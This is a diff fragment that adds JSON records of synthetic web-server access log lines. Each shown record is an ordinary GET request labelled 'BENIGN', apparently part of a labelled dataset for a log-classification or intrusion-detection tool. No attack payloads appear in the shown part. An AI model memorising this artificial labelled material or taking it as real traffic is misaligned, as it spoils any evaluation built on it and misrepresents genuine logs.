+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.58 - - [01/Jun/2026:10:08:16 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.59 - - [01/Jun/2026:10:08:18 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.60 - - [01/Jun/2026:10:08:20 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.61 - - [01/Jun/2026:10:08:22 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.62 - - [01/Jun/2026:10:08:24 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.63 - - [01/Jun/2026:10:08:26 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.64 - - [01/Jun/2026:10:08:28 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.65 - - [01/Jun/2026:10:08:30 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.66 - - [01/Jun/2026:10:08:32 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.67 - - [01/Jun/2026:10:08:34 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.68 - - [01/Jun/2026:10:08:36 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.69 - - [01/Jun/2026:10:08:38 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.70 - - [01/Jun/2026:10:08:40 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.71 - - [01/Jun/2026:10:08:42 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.72 - - [01/Jun/2026:10:08:44 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.73 - - [01/Jun/2026:10:08:46 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.74 - - [01/Jun/2026:10:08:48 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.75 - - [01/Jun/2026:10:08:50 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.76 - - [01/Jun/2026:10:08:52 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.77 - - [01/Jun/2026:10:08:54 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.78 - - [01/Jun/2026:10:08:56 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.79 - - [01/Jun/2026:10:08:58 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.80 - - [01/Jun/2026:10:09:00 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.81 - - [01/Jun/2026:10:09:02 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.82 - - [01/Jun/2026:10:09:04 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.83 - - [01/Jun/2026:10:09:06 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.84 - - [01/Jun/2026:10:09:08 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.85 - - [01/Jun/2026:10:09:10 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.86 - - [01/Jun/2026:10:09:12 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.87 - - [01/Jun/2026:10:09:14 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.88 - - [01/Jun/2026:10:09:16 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.89 - - [01/Jun/2026:10:09:18 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.90 - - [01/Jun/2026:10:09:20 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.91 - - [01/Jun/2026:10:09:22 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.92 - - [01/Jun/2026:10:09:24 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.93 - - [01/Jun/2026:10:09:26 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.94 - - [01/Jun/2026:10:09:28 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.95 - - [01/Jun/2026:10:09:30 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.96 - - [01/Jun/2026:10:09:32 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.97 - - [01/Jun/2026:10:09:34 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.98 - - [01/Jun/2026:10:09:36 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.99 - - [01/Jun/2026:10:09:38 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.100 - - [01/Jun/2026:10:09:40 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.101 - - [01/Jun/2026:10:09:42 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.102 - - [01/Jun/2026:10:09:44 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.103 - - [01/Jun/2026:10:09:46 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.104 - - [01/Jun/2026:10:09:48 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.105 - - [01/Jun/2026:10:09:50 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.106 - - [01/Jun/2026:10:09:52 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.107 - - [01/Jun/2026:10:09:54 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.108 - - [01/Jun/2026:10:09:56 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.109 - - [01/Jun/2026:10:09:58 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.110 - - [01/Jun/2026:10:10:00 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.111 - - [01/Jun/2026:10:10:02 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.112 - - [01/Jun/2026:10:10:04 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.113 - - [01/Jun/2026:10:10:06 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.114 - - [01/Jun/2026:10:10:08 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.115 - - [01/Jun/2026:10:10:10 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.116 - - [01/Jun/2026:10:10:12 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.117 - - [01/Jun/2026:10:10:14 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.118 - - [01/Jun/2026:10:10:16 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.119 - - [01/Jun/2026:10:10:18 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.120 - - [01/Jun/2026:10:10:20 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.121 - - [01/Jun/2026:10:10:22 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.122 - - [01/Jun/2026:10:10:24 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.123 - - [01/Jun/2026:10:10:26 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.124 - - [01/Jun/2026:10:10:28 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.125 - - [01/Jun/2026:10:10:30 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.126 - - [01/Jun/2026:10:10:32 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.127 - - [01/Jun/2026:10:10:34 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.128 - - [01/Jun/2026:10:10:36 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.129 - - [01/Jun/2026:10:10:38 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.130 - - [01/Jun/2026:10:10:40 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.131 - - [01/Jun/2026:10:10:42 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.132 - - [01/Jun/2026:10:10:44 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.133 - - [01/Jun/2026:10:10:46 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.134 - - [01/Jun/2026:10:10:48 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.135 - - [01/Jun/2026:10:10:50 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.136 - - [01/Jun/2026:10:10:52 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.137 - - [01/Jun/2026:10:10:54 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.138 - - [01/Jun/2026:10:10:56 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.139 - - [01/Jun/2026:10:10:58 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.140 - - [01/Jun/2026:10:11:00 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.141 - - [01/Jun/2026:10:11:02 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.142 - - [01/Jun/2026:10:11:04 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.143 - - [01/Jun/2026:10:11:06 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.144 - - [01/Jun/2026:10:11:08 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.145 - - [01/Jun/2026:10:11:10 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.146 - - [01/Jun/2026:10:11:12 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.147 - - [01/Jun/2026:10:11:14 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.148 - - [01/Jun/2026:10:11:16 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.149 - - [01/Jun/2026:10:11:18 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.150 - - [01/Jun/2026:10:11:20 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.151 - - [01/Jun/2026:10:11:22 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.152 - - [01/Jun/2026:10:11:24 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.153 - - [01/Jun/2026:10:11:26 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.154 - - [01/Jun/2026:10:11:28 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.155 - - [01/Jun/2026:10:11:30 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.156 - - [01/Jun/2026:10:11:32 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.157 - - [01/Jun/2026:10:11:34 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.158 - - [01/Jun/2026:10:11:36 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.159 - - [01/Jun/2026:10:11:38 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.160 - - [01/Jun/2026:10:11:40 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.161 - - [01/Jun/2026:10:11:42 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.162 - - [01/Jun/2026:10:11:44 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.163 - - [01/Jun/2026:10:11:46 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.164 - - [01/Jun/2026:10:11:48 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.165 - - [01/Jun/2026:10:11:50 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.166 - - [01/Jun/2026:10:11:52 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.167 - - [01/Jun/2026:10:11:54 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.168 - - [01/Jun/2026:10:11:56 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.169 - - [01/Jun/2026:10:11:58 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.170 - - [01/Jun/2026:10:12:00 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.171 - - [01/Jun/2026:10:12:02 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.172 - - [01/Jun/2026:10:12:04 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.173 - - [01/Jun/2026:10:12:06 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.174 - - [01/Jun/2026:10:12:08 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.175 - - [01/Jun/2026:10:12:10 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.176 - - [01/Jun/2026:10:12:12 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.177 - - [01/Jun/2026:10:12:14 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.178 - - [01/Jun/2026:10:12:16 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.179 - - [01/Jun/2026:10:12:18 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.180 - - [01/Jun/2026:10:12:20 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
